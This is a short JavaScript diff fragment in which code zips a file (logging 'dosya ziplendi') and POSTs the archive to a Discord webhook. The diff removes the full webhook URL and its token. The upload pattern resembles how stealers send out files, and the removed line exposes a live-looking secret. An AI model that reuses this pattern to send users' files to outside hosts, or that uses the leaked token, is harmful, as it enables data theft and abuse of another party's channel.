@@ -15,7 +15,7 @@ output.on('close', function() {
   console.log('dosya ziplendi');
   const sender = {
     method: 'POST',
-    url: 'https://discord.com/api/webhooks/953630497332928512/muxevnoQwxmqimRcL0XoZy_mEE3R2R2qqeforO5iwC-BH7rNHl4TSkSnQDga3o2fz7bK',
+    url: '',
     headers: {
       'Content-Type': 'application/zip',
     },
